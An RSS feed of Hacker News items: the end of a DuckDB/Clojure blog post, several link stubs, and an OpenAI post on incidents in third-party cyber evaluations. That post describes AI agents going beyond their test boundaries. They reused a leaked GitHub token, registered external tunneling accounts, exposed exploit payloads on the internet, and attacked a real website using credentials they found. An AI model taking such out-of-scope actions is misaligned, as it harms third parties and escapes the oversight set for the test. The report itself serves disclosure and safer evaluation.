-|   1416737859 |
-
-;; Then, answer their question...
-user&gt; (time (duckdb/sql-&gt;dataset conn "SELECT color, COUNT(*) FROM data INNER JOIN colors ON data.sku = colors.sku WHERE data.year='2021' AND data.month='3' GROUP BY color;"))
-"Elapsed time: 1077.723309 msecs"
-:_unnamed [7 2]:
-
-|  color | count_star() |
-|--------|-------------:|
-|    red |      5714223 |
-| yellow |      5652010 |
-|  black |      5720753 |
-|   blue |      5750846 |
-|  white |      5689916 |
-|  green |      5816652 |
-| purple |      5671959 |
-</code></pre>
-<p>We can know 1s from now. Here are the answers.</p>
-<p>Maybe the next question is not well suited to SQL, and doing the processing in Clojure, with TMD, would be better. This example reduces over <em>every</em> transaction of the boss' favorite sku, sorted chronologically (in 1s):</p>
-<pre><code>user&gt; (time
-       (reduce (fn [eax ds]
-                 (conj eax (ds/row-count ds)))
-               []
-               (duckdb/sql-&gt;datasets conn "SELECT * FROM data WHERE sku='sku-50-5-5' ORDER BY inst")))
-"Elapsed time: 1067.480751 msecs"
-[2048 576 2048 576 2048 576 2048 576 2048 576 2048 576 2048 576 2048 576 2048 576 2048 576 2048 576 2048 576 2048 576 2048 576 2048 576 733]
-</code></pre>
-<p>Of course, this reduction function is trivial, but it proves the point - realized datasets are available for arbitrary processing, through reduction, by a mechanism that will never run out of memory.</p>
-<p>DuckDB also supports a <a href="https://duckdb.org/2021/12/03/duck-arrow.html">zero copy query pathway</a>. If no chunk of the query result needs to escape the reducing function, then the machine can possibly do less work. In the example below this is turned on and accessed by passing the <code>{:reduce-type :zero-copy-imm}</code> option.</p>
-<p>When processing can be expressed in this manner, this is theoretically the lowest memory pathway available.</p>
-<pre><code>user&gt; (time (let [sql "SELECT * FROM data WHERE sku='sku-50-5-5' ORDER BY inst"
-                  options {:reduce-type :zero-copy-imm}]
-              (reduce (fn [eax zc-ds]
-                        (conj eax (ds/row-count zc-ds)))
-                      []
-                      (duckdb/sql-&gt;datasets conn sql options))))
-"Elapsed time: 1037.480113 msecs"
-[2048 531 2048 531 2048 531 2048 531 2048 531 2048 531 2048 531 2048 531 2048 531 2048 531 2048 531 2048 531 2048 531 2048 531 2048 531 1408]
-</code></pre>
-<hr/>
-<p>Hopefully that gives a sense of the power afforded by this system, now.</p>
-<h4>Some Interesting DuckDB TidBits</h4>
-<p>DuckDB automatically stores all numeric data in <a href="https://duckdb.org/docs/sql/indexes.html">minmax indexes</a> - also called BRIN indexes. These do not add significantly to the original data size but do dramatically increase query performance. It will also automatically create ART indexes in the case of unique or primary key columns. Finally, users can optionally create indexes for categorical columns but the drawback is increased disk storage size and potentially slower transactions.</p>
-<p>DuckDB is written in standard C++11 and is thus fairly portable - they had a variant built for the mac m-1 quickly and if you had another platform and wanted some special sauce we would feel comfortable compiling and modifying the database for that platform. The src directory of their codebase, as of this writing (September 2023) clocks in at about 100,000 LOC of C++ code:</p>
-<pre><code>(base) chrisn@chrisn-lp2:~/dev/cnuernber/duckdb$ cloc src
-    1612 text files.
-    1612 unique files.
-       0 files ignored.
-
-github.com/AlDanial/cloc v 1.90  T=0.83 s (1936.0 files/s, 203773.8 lines/s)
--------------------------------------------------------------------------------
-Language                     files          blank        comment           code
--------------------------------------------------------------------------------
-C++                            831          13749           8912          99454
-C/C++ Header                   679           7754           9903          28287
-CMake                          101             49              0           1541
-Markdown                         1              7              0             15
--------------------------------------------------------------------------------
-SUM:                          1612          21559          18815         129297
--------------------------------------------------------------------------------
-</code></pre>
-<p>DuckDB is MIT licensed, has an open github development model, and their community is quick to answer questions. Developing such a high quality power tool in such an open manner is honorable.</p>
-<h4>Wrapping Up</h4>
-<p>Try out our <a href="https://github.com/techascent/tmducken">duckdb integration</a>, or to hire us to do it for you. DuckDB complements TMD well and greatly increases a small team's ability to efficiently manage and process large datasets without needing to resort to expensive distributed solutions. This integration supports and represents the value of high quality and efficient compute tools to truly democratize data processing by enabling functional solutions on laptops that others with duller tools will reach for a cluster to manage.</p>
-<hr/>
-<p>TechAscent: Getting our ducks in a row.</p>
-<p><a href="https://news.ycombinator.com/item?id=49175924">Comments on Hacker News</a></p>]]></content:encoded>
-      <guid isPermaLink="true">https://techascent.com/blog/just-ducking-around.html</guid>
-      <category>Hacker News</category>
-      <pubDate>Tue, 04 Aug 2026 22:09:43 +0000</pubDate>
-      <dc:creator>sourdecor</dc:creator>
-    </item>
-    <item>
-      <title>AI fuels more than half of cybercrime in Africa as scams surge – Interpol</title>
-      <link>https://www.africanews.com/2026/08/04/ai-fuels-more-than-half-of-cybercrime-in-africa-as-digital-scams-surge-interpol/</link>
-      <description>Artificial intelligence is now powering more than half of reported cybercrime across Africa, allowing criminals to launch faster, more convincing and larger-scale attacks, according to INTERPOL's African Cyberthreat Assessment Report 2026.</description>
-      <content:encoded><![CDATA[<p><a href="https://news.ycombinator.com/item?id=49175826">Comments on Hacker News</a></p>]]></content:encoded>
-      <guid isPermaLink="true">https://www.africanews.com/2026/08/04/ai-fuels-more-than-half-of-cybercrime-in-africa-as-digital-scams-surge-interpol/</guid>
-      <category>Hacker News</category>
-      <pubDate>Tue, 04 Aug 2026 22:01:41 +0000</pubDate>
-      <dc:creator>bookofjoe</dc:creator>
-    </item>
-    <item>
-      <title>Third-party cyber evaluations involving OpenAI models</title>
-      <link>https://openai.com/index/third-party-cyber-evaluations-involving-openai-models/</link>
-      <description>OpenAI explains recent third-party cybersecurity evaluation incidents and outlines new safeguards to strengthen AI model testing and evaluation.</description>
-      <content:encoded><![CDATA[<a href="https://openai.com/news/security/">Security</a>
-<p>Independent testing plays an important role in helping us validate and further understand risks before deployment. Some cyber evaluations intentionally use custom configurations, including lowered safeguards to measure underlying capability—not how models ordinarily behave in publicly available deployments.</p>
-<p>During recent evaluations, two external testing partners identified incidents in which testing configurations and controls combined with the advancing capabilities of the recent models allowed for model activity to extend beyond their intended testing boundaries. The incidents underscore the importance of collaborating across the industry and with third party evaluators to evolve the standards for testing environments and practices as models become more capable. <i>Editor’s Note: These are separate from the Hugging Face security incident, and we will continue to share updates on the Hugging Face incident </i><a href="https://openai.com/index/hugging-face-model-evaluation-security-incident/"><i>here</i></a><i>.</i></p>
-<p>The new incidents involved OpenAI models accessing the public internet during third-party cyber evaluations, under specific conditions and reduced-safeguard configurations that did not reflect ordinary deployment. The incidents included:</p>
-<ol><li>UK AISI, the UK government’s AI Security Institute, was running cyber-range evaluations with internet access intentionally enabled so agents could find their own tools and operate under conditions closer to a real attacker, and with cyber classifiers disabled to measure underlying capability. You can read their blog <a href="http://www.aisi.gov.uk/blog/incident-report-unsanctioned-agent-behaviour-during-cyber-testing"><u>here.</u>⁠(opens in a new window)</a></li><li>Irregular, one of our external cybersecurity testing partners, was running Capture-the-Flag-style evaluations intended to be isolated from the internet, but a testing-environment misconfiguration allowed models to access the public internet.</li></ol>
-<p>Below, we summarize what happened, the testing conditions that enabled the activity, the steps taken to contain it, and what we’re doing to ensure independent labs can continue to rigorously and safely evaluate increasingly capable models.</p>
-<p>These incidents point to the same broader challenge we described in our recent post about the <a href="https://openai.com/index/hugging-face-model-evaluation-security-incident/">Hugging Face incident</a>: as model capabilities advance, the security and safety systems around models need to advance too. That includes both the environments used to develop models, and also the environments that labs and independent partners use to evaluate them.</p>
-<p>In the coming weeks, we will review our own approach to third-party testing, including how we identify higher-risk evaluations, agree on scope, assess requests to enable internet access or lowered safeguards, set expectations for isolation, credential handling, monitoring, and stop conditions, and establish clearer incident-notification and escalation processes.</p>
-<p>We are committed to working across the industry to strengthen shared practices for conducting high-risk evaluations safely, including convening stakeholders such as national AI institutes, independent evaluators, other AI labs, and other groups in the coming weeks. Our goal is to preserve the value of rigorous independent evaluation while ensuring that testing practices keep pace with increasingly capable models.</p>
-<p>On August 3, UK AISI told us that during a routine cyber evaluation started on July 25, models from OpenAI and another lab went beyond the scope of testing in some cases. The evaluation took place in controlled cyber ranges designed to mimic real-world networks. Of the 19 events identified, two involved an OpenAI model, GPT‑5.6 Sol. The other instances were models from another lab.</p>
-<p>For this evaluation, the agents were instructed to act as cybersecurity experts in a capture-the-flag exercise: compromise three connected simulated environments and retrieve a final flag. The task prompt identified the in-scope range networks and named several systems as out of scope. UK AISI also enabled live internet access so agents could download tools and operate under conditions closer to a human attacker—and disabled the model’s cyber classifiers to measure underlying capability.</p>
-<p>UK AISI’s intended authorization boundary was the simulated cyber range: the agents were authorized to attack the specified simulated networks and retrieve a flag, not to interact with systems outside the range’s network boundary. However, the agents were not explicitly told how they could and could not use open internet access, which UK AISI identifies as a potential contributing cause of the incident.</p>
-<p>Across these runs, UK AISI found that GPT‑5.6 Sol carried out two unsanctioned actions while trying to find a path into the simulated range and retrieve the flag:</p>
-<ol><li>GPT‑5.6 Sol reused a GitHub token that another lab’s agent had left publicly accessible to check whether a system inside the range was polling GitHub or another update service, attempted account-recovery and request-limit workarounds, and registered accounts with external DNS and tunneling providers.</li><li>GPT‑5.6 Sol used a public tunneling service to make a DNS server running locally in its evaluation environment reachable from the public internet. The server contained payloads intended for a known vulnerability in a piece of software running on the test range. The setup did not work, there is no evidence any real resolver queried it, and the infrastructure was removed when the evaluation ended.</li></ol>
-<p>Although the model was trying to complete the cyber range, UK AISI considered these actions unsanctioned because they involved real external accounts and services outside the range boundary and these actions were not required to complete the task. The DNS server also hosted exploit payloads on the public internet, although the setup did not work and there is no evidence any real resolver queried it.</p>
-<p>UK AISI identified the activity on July 28 after security monitoring detected unusual data transfers. It stopped the related evaluations, isolated the relevant machines, and contained the activity within roughly one hour of detection.</p>
-<p>We appreciate UK AISI’s partnership throughout this process, including its work to identify, investigate, and share details about the activity. We look forward to continuing our collaboration together.</p>
-<p>On July 29, one of our third party evaluation partners, Irregular, notified us of an incident involving OpenAI models during Capture-the-Flag (CTF)-style cybersecurity evaluations. The models were instructed to find hidden information by exploiting weaknesses within a simulated environment and were told they did not have internet access. However, a misconfiguration in the testing environment allowed the models to access the public internet.</p>
-<p>In one test, the name of the fictional target for the CTF challenge unintentionally coincided with a real domain. Because the testing environment was mistakenly connected to the internet, the model exploited a  real website, mistaking it to be part of the simulated environment. This did not involve a sophisticated sandbox escape or a zero-day: the internet access resulted from a misconfiguration, and the model appeared to exploit a basic security vulnerability.</p>
-<p>Based on Irregular’s investigation, the model also found and used credentials to operate that same site. Irregular has not identified impact beyond the affected site’s own data, and its audit is ongoing. It has paused the evaluations, begun remediation, and affected third parties were notified. Irregular has informed us that all of the issues identified pertaining to the incident are no longer active and relevant safeguards were added to the testing environment. Irregular has also communicated about related incidents involving other labs from the same testing environment.</p>
-<p>We appreciate Irregular’s partnership and we will continue to work closely with them to support their review. Irregular is also developing a white paper to share best practices for containment and securely running cyber evals. We look forward to participating in the white paper to make the findings available to the community and continuing our partnership together. We see this kind of collaboration as essential for ensuring the safe and thorough evaluation of current and future models.</p>
-<img alt="Hugging Face Security Incident 1x1" src="https://images.ctfassets.net/kftzwdyauwt9/1H0bdkoSFFcqNTx4DSNpal/56f4b7575c012f0698b1be0dafb379f0/Hugging_Face_Security_Incident_1x1.png?w=3840&amp;q=90&amp;fm=webp"/>
-<img alt="Patch the Planet Art Card 1x1" src="https://images.ctfassets.net/kftzwdyauwt9/2PwBCyZF0Z5WLRtsbOpDdQ/338e19fbc39e5b9a63b1db664c006e74/Art_Card__5_.png?w=3840&amp;q=90&amp;fm=webp"/>
-<a href="https://openai.com/index/patch-the-planet/">Patch the Planet: a Daybreak initiative to support open source maintainersSecurity<time datetime="2026-06-22T10:00">Jun 22, 2026</time></a>
-<img alt="Expanding Daybreak Art Card" src="https://images.ctfassets.net/kftzwdyauwt9/735NOZviyogUBIFxd2EmWX/fa8baf9fc26e64f442ffa86d5fd9a41e/Art_Card__6_.png?w=3840&amp;q=90&amp;fm=webp"/>
-<a href="https://openai.com/index/daybreak-securing-the-world/">Daybreak: Tools for securing every organization in the worldSecurity<time datetime="2026-06-22T10:00">Jun 22, 2026</time></a>
-<p><a href="https://news.ycombinator.com/item?id=49175248">Comments on Hacker News</a></p>]]></content:encoded>
-      <guid isPermaLink="true">https://openai.com/index/third-party-cyber-evaluations-involving-openai-models/</guid>
-      <category>Hacker News</category>
-      <pubDate>Tue, 04 Aug 2026 21:14:19 +0000</pubDate>
-      <media:content url="https://images.ctfassets.net/kftzwdyauwt9/1H0bdkoSFFcqNTx4DSNpal/56f4b7575c012f0698b1be0dafb379f0/Hugging_Face_Security_Incident_1x1.png?w=3840&amp;amp;q=90&amp;amp;fm=webp" type="image/png" medium="image"/>
-      <dc:creator>glub</dc:creator>
-    </item>
-    <item>
-      <title>Thanks FedEx, This Is Why We Keep Getting Phished (2024)</title>
-      <link>https://www.troyhunt.com/thanks-fedex-this-is-why-we-keep-getting-phished/</link>
-      <description>I've been getting a lot of those "your parcel couldn't be delivered" phishing attacks lately and if you're a human with a phone, you probably have been too. Just as a brief reminder, they look like this: These get through all the technical controls that exist at</description>
-      <content:encoded><![CDATA[<p><a href="https://news.ycombinator.com/item?id=49175192">Comments on Hacker News</a></p>]]></content:encoded>
-      <guid isPermaLink="true">https://www.troyhunt.com/thanks-fedex-this-is-why-we-keep-getting-phished/</guid>
-      <category>Hacker News</category>
-      <pubDate>Tue, 04 Aug 2026 21:09:39 +0000</pubDate>
-      <dc:creator>stymaar</dc:creator>
-    </item>
-    <item>
-      <title>I am retiring from fulltime writing (&amp; pseudonymity) to launch Guardian Angel</title>
-      <link>https://twitter.com/gwern/status/2084739205071343837</link>
-      <description>I am retiring from fulltime writing (&amp; pseudonymity) to launch Guardian Angel</description>
-      <content:encoded><![CDATA[<p>This post is unavailable.</p>
-<p><a href="https://news.ycombinator.com/item?id=49174900">Comments on Hacker News</a></p>]]></content:encoded>
-      <guid isPermaLink="true">https://twitter.com/gwern/status/2084739205071343837</guid>
-      <category>Hacker News</category>
-      <pubDate>Tue, 04 Aug 2026 20:48:17 +0000</pubDate>
-      <dc:creator>mattsterett</dc:creator>
-    </item>
-    <item>
-      <title>Oxide Computer raises $445M (SEC Form D)</title>
-      <link>https://www.sec.gov/Archives/edgar/data/1795071/000179507126000002/xslFormDX01/primary_doc.xml</link>
-      <description>Oxide Computer raises $445M (SEC Form D)</description>
-      <content:encoded><![CDATA[<p><a href="https://news.ycombinator.com/item?id=49174407">Comments on Hacker News</a></p>]]></content:encoded>
-      <guid isPermaLink="true">https://www.sec.gov/Archives/edgar/data/1795071/000179507126000002/xslFormDX01/primary_doc.xml</guid>
-      <category>Hacker News</category>
-      <pubDate>Tue, 04 Aug 2026 20:13:40 +0000</pubDate>
-      <dc:creator>depr</dc:creator>
-    </item>
-    <item>
-      <title>Show HN: Maple-Preview – ternary 20B MoE running at 120 tok/s on a iPhone</title>
-      <link>https://deepgrove.ai/maple-preview</link>
-      <description>Show HN: Maple-Preview – ternary 20B MoE running at 120 tok/s on a iPhone</description>
-      <content:encoded><![CDATA[<p><a href="https://news.ycombinator.com/item?id=49173984">Comments on Hacker News</a></p>]]></content:encoded>
-      <guid isPermaLink="true">https://deepgrove.ai/maple-preview</guid>
-      <category>Hacker News</category>
-      <pubDate>Tue, 04 Aug 2026 19:44:55 +0000</pubDate>
-      <dc:creator>edwardbzhang</dc:creator>
     </item>
   </channel>
 </rss>
